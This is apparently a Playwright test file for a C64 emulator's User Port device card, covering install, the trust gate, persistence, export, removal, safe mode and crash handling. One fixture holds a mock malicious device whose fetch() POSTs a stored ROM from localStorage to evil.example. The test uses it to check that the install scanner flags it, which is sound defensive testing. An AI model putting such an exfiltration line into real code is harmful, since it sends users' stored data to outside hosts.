// The User Port card (src/userport/card.js) and the installed-device store
// (src/userport/store.js) in a real browser: the app on its own Vite dev
// server, driven by headless Chromium. Install with the trust gate, replace,
// export, remove, persistence in IndexedDB across a reload, the switch and
// header, a crashing device staying off, the relay field, safe mode, and
// POWER OFF unplugging the device.
//
// Needs Playwright's Chromium (npx playwright install chromium). Without it the
// file reports a SKIP. The checks that power the machine on need the ROMs.

import fs from 'node:fs';
import net from 'node:net';
import { fileURLToPath } from 'node:url';
import { readAsset } from '../external-assets.js';

let chromium;
try { ({ chromium } = await import('playwright')); } catch { /* reported below */ }
let browser = null;
if (chromium) { try { browser = await chromium.launch(); } catch { browser = null; } }
if (!browser) {
  console.log('# SKIP Playwright Chromium is not installed (npx playwright install chromium)');
  process.exit(0);
}

let testNo = 0, failing = 0, current = [];
function expect(cond, msg) { if (!cond) current.push(msg); }
function ok(label) {
  testNo++;
  if (!current.length) console.log(`ok  - test ${testNo}: ${label}`);
  else {
    failing++;
    console.log(`FAIL test ${testNo}: ${label}`);
    for (const m of current) console.log(`     - ${m}`);
    current = [];
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const root = fileURLToPath(new URL('../../', import.meta.url));
const freePort = await new Promise((r) => { const s = net.createServer(); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
// A dev server of its own that leaves public/docs alone, so the docs tests
// running alongside never see files being rewritten.
process.env.VITE_BUILD_DOCS = '0';
const { createServer } = await import('vite');
const vite = await createServer({ root, configFile: `${root}vite.config.js`, logLevel: 'silent', server: { port: freePort, strictPort: true, host: '127.0.0.1' } });
await vite.listen();
const BASE = `http://127.0.0.1:${freePort}`;
const LED_URL = `${BASE}/userport/led-board.js`;

const roms = {};
const kernal = readAsset('kernal'), basic = readAsset('basic'), chargen = readAsset('chargen');
if (kernal && basic && chargen) {
  roms['c64emu.rom.kernal'] = kernal.toString('base64');
  roms['c64emu.rom.basic'] = basic.toString('base64');
  roms['c64emu.rom.charRom'] = chargen.toString('base64');
}
const haveRoms = Object.keys(roms).length === 3;

async function newPage(prefs = {}, url = BASE) {
  const ctx = await browser.newContext({ viewport: { width: 1460, height: 1180 } });
  await ctx.addInitScript(({ roms, prefs }) => {
    if (sessionStorage.getItem('seeded')) return;      // only on the first load, so reloads keep what the page saved
    sessionStorage.setItem('seeded', '1');
    for (const [k, v] of Object.entries({ ...roms, ...prefs })) localStorage.setItem(k, v);
    localStorage.setItem('c64emu.splashSeen', '1');
    localStorage.setItem('c64emu.installDismissed', '1');
  }, { roms, prefs });
  const page = await ctx.newPage();
  await page.goto(url, { waitUntil: 'networkidle' });
  try { if (await page.locator('#setup-modal:not([hidden])').isVisible()) await page.click('#btn-setup-later'); } catch { /* no dialog */ }
  return { ctx, page };
}
const state = (page) => page.evaluate(() => ({
  expanded: document.getElementById('userport-card').classList.contains('expanded'),
  on: document.getElementById('userport-power').checked,
  disabled: document.getElementById('userport-power').disabled,
  device: document.getElementById('userport-device').value,
  options: [...document.querySelectorAll('#userport-device option')].map((o) => o.value),
  status: document.getElementById('userport-status').textContent,
}));
async function installFromUrl(page, url, { tick = true } = {}) {
  await page.click('#btn-userport-url');
  await page.fill('#prompt-modal-input', url);
  await page.click('#btn-prompt-ok');
  await page.waitForSelector('#userport-modal:not([hidden])');
  const go = page.locator('#userport-modal-actions .btn:last-child');
  const gated = await go.isDisabled();
  if (tick) { await page.click('#userport-install-trust'); await go.click(); await sleep(800); }
  return gated;
}

try {
  // ── Switch and header ───────────────────────────────────────────────────
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'off' });
    const s0 = await state(page);
    await page.click('#userport-card .panel-card-header h2');
    const s1 = await state(page);
    await page.click('#userport-card .panel-card-header h2');
    const s2 = await state(page);
    expect(!s0.on && !s0.expanded, 'starts off and closed');
    expect(s1.on && s1.expanded, 'the header switches it on and opens it');
    expect(!s2.on && !s2.expanded, 'and off and closed again');
    expect(s0.options.includes('builtin.wifi-modem'), 'the built-in modem is listed');
    expect(await page.evaluate(() => localStorage.getItem('c64emu.userport')) === 'off', 'the switch is remembered');
    await ctx.close();
    ok('the switch and the header plug the device in and open the card, like drive 9 and the REU');
  }

  // ── Installing, the trust gate, persistence, replace, export, remove ───
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    const gated = await installFromUrl(page, LED_URL, { tick: false });
    const warningFirst = await page.evaluate(() => document.querySelector('#userport-modal-body > *')?.classList.contains('userport-warning'));
    expect(gated, 'INSTALL is disabled until the trust box is ticked');
    expect(warningFirst, 'the warning leads the dialog');
    expect(/Nothing risky found/.test(await page.textContent('.userport-findings')), 'the clean LED board shows no findings');
    await page.click('#userport-install-trust');
    expect(!(await page.locator('#userport-modal-actions .btn:last-child').isDisabled()), 'ticking enables it');
    await page.click('#userport-modal-actions .btn:last-child');
    await sleep(800);
    let s = await state(page);
    expect(s.device === 'example.led-board' && s.options.includes('example.led-board'), 'installed, listed and selected');
    ok('install from a URL: the warning comes first and INSTALL waits for the trust box');

    await page.reload({ waitUntil: 'networkidle' });
    await sleep(500);
    s = await state(page);
    expect(s.options.includes('example.led-board') && s.device === 'example.led-board', 'still installed and selected after a reload (IndexedDB)');
    ok('installed devices persist in the browser across a reload');

    await page.click('#btn-userport-url');
    await page.fill('#prompt-modal-input', LED_URL);
    await page.click('#btn-prompt-ok');
    await page.waitForSelector('#userport-modal:not([hidden])');
    const title = await page.textContent('#userport-modal-title');
    const label = await page.textContent('#userport-modal-actions .btn:last-child');
    expect(title === 'Replace device' && label === 'REPLACE', `the same id again offers to replace: ${title} / ${label}`);
    await page.click('#btn-userport-modal-x');
    ok('installing the same id again is a replace');

    await page.click('#btn-userport-manage');
    await page.waitForSelector('#userport-modal:not([hidden])');
    const rows = await page.$$eval('.userport-list li .name', (els) => els.map((e) => e.firstChild.textContent));
    expect(rows.some((r) => r.startsWith('WiFi modem')) && rows.some((r) => r.startsWith('LED board')), `MANAGE lists built-in and installed: ${rows}`);
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.locator('.userport-list li', { hasText: 'LED board' }).locator('.btn', { hasText: 'EXPORT' }).click(),
    ]);
    const exported = fs.readFileSync(await download.path(), 'utf8');
    expect(exported === fs.readFileSync(new URL('../../public/userport/led-board.js', import.meta.url), 'utf8'), 'EXPORT gives back the installed file');
    await page.locator('.userport-list li', { hasText: 'LED board' }).locator('.btn', { hasText: 'REMOVE' }).click();
    await sleep(800);
    s = await state(page);
    expect(!s.options.includes('example.led-board') && s.device === 'builtin.wifi-modem', 'REMOVE drops it and falls back to the modem');
    await page.reload({ waitUntil: 'networkidle' });
    await sleep(500);
    expect(!(await state(page)).options.includes('example.led-board'), 'and it stays removed after a reload');
    await ctx.close();
    ok('MANAGE: export returns the file, remove deletes it for good');
  }

  // ── The install check lists what a risky file does ─────────────────────
  {
    const risky = `export const meta = { id: 'example.risky', name: 'Risky', version: '1.0.0', apiVersion: 1 };
export function create() {
  fetch('https://evil.example/collect', { method: 'POST', body: localStorage.getItem('c64emu.rom.kernal') });
  return {};
}`;
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    const url = `${BASE}/__risky.js`;
    await page.route(url, (r) => r.fulfill({ status: 200, contentType: 'text/javascript', body: risky }));
    await installFromUrl(page, url, { tick: false });
    const items = await page.$$eval('.userport-findings li', (els) => els.map((e) => [e.className, e.textContent]));
    expect(items.some(([c, t]) => c === 'high' && /network/.test(t) && /evil\.example/.test(t)), `network finding with the address: ${JSON.stringify(items)}`);
    expect(items.some(([c, t]) => c === 'high' && /storage/.test(t)), 'storage finding');
    expect(await page.locator('#userport-modal-actions .btn:last-child').isDisabled(), 'still gated on the trust box');
    await page.locator('.userport-modal-card').screenshot({ path: fileURLToPath(new URL('../../investigation/userport-shots/install-findings.png', import.meta.url)) }).catch(() => {});
    await ctx.close();
    ok('the install dialog lists what a risky file does, with the addresses it contacts');
  }

  // ── Not a device ────────────────────────────────────────────────────────
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    await page.click('#btn-userport-url');
    await page.fill('#prompt-modal-input', `${BASE}/userport/userport-device.d.ts`);
    await page.click('#btn-prompt-ok');
    await page.waitForSelector('#userport-modal:not([hidden])');
    expect(await page.textContent('#userport-modal-title') === 'Not a user port device', 'a file that is not a device is refused');
    expect(!(await page.locator('#userport-install-trust').count()), 'with no way to install it');
    await ctx.close();
    ok('a file that is not a device is refused before anything is stored');
  }

  // ── Relay field and safe mode ───────────────────────────────────────────
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    expect((await page.getAttribute('#userport-relay', 'placeholder')).endsWith('/relay'), 'served locally, the placeholder shows the app\'s own relay');
    await page.fill('#userport-relay', 'wss://relay.example/relay');
    await page.press('#userport-relay', 'Tab');
    await page.reload({ waitUntil: 'networkidle' });
    expect(await page.inputValue('#userport-relay') === 'wss://relay.example/relay', 'the relay address is remembered');
    await ctx.close();
    const safe = await newPage({ 'c64emu.userport': 'on' }, `${BASE}/?USERPORT_SAFE=1`);
    const s = await state(safe.page);
    expect(s.disabled && !s.on && /Safe mode/.test(s.status), `safe mode: switch locked off, status says so (${s.status})`);
    await safe.ctx.close();
    ok('the relay address is remembered, and safe mode loads no device code');
  }

  // ── With the machine on: crash and power off ───────────────────────────
  if (!haveRoms) {
    console.log('ok  - a crashing device stays off, POWER OFF unplugs # SKIP no C64 ROMs');
  } else {
    const crashy = `export const meta = { id: 'example.crashy', name: 'Crashy', version: '1.0.0', apiVersion: 1 };
export function create() { return { onPortB() { throw new Error('crashed on purpose'); } }; }`;
    const srcUrl = `${BASE}/__crashy.js`;
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    await page.route(srcUrl, (r) => r.fulfill({ status: 200, contentType: 'text/javascript', body: crashy }));
    await page.click('#btn-power');
    await sleep(4500);
    await installFromUrl(page, srcUrl);
    await page.evaluate(() => { window.machine.cia2.write(0x03, 0xff); });
    await sleep(300);
    let s = await state(page);
    expect(!s.on && s.expanded && /crashed on purpose/.test(s.status), `the crash switches the port off and shows why, card open: ${s.status}`);
    expect(await page.evaluate(() => localStorage.getItem('c64emu.userport')) === 'off', 'and it stays off after a reload');
    expect(await page.evaluate(() => window.machine.userport === null || window.machine.userport.device === null), 'the device is out of the machine');
    ok('a crashing device is unplugged, the C64 runs on, and it stays off');

    await page.selectOption('#userport-device', 'builtin.wifi-modem');
    await page.check('#userport-power').catch(() => page.click('#userport-power-switch'));
    await sleep(800);
    s = await state(page);
    expect(s.on && /Ready/.test(s.status), `the modem plugs in: ${s.status}`);
    await page.click('#btn-power');
    await sleep(800);
    s = await state(page);
    expect(/Waiting for the C64/.test(s.status), `POWER OFF: the card says the C64 is off (${s.status})`);
    await page.click('#btn-power');
    await sleep(4500);
    s = await state(page);
    expect(/Ready/.test(s.status) && await page.evaluate(() => window.machine.userport?.deviceId === 'builtin.wifi-modem'), 'POWER ON plugs it back in');
    await ctx.close();
    ok('POWER OFF unplugs the device and POWER ON plugs it back');
  }
} finally {
  await browser.close();
  await vite.close();
}

console.log(failing ? `\n${failing} of ${testNo} FAILED` : `\nall ${testNo} passed`);
process.exit(failing ? 1 : 0);
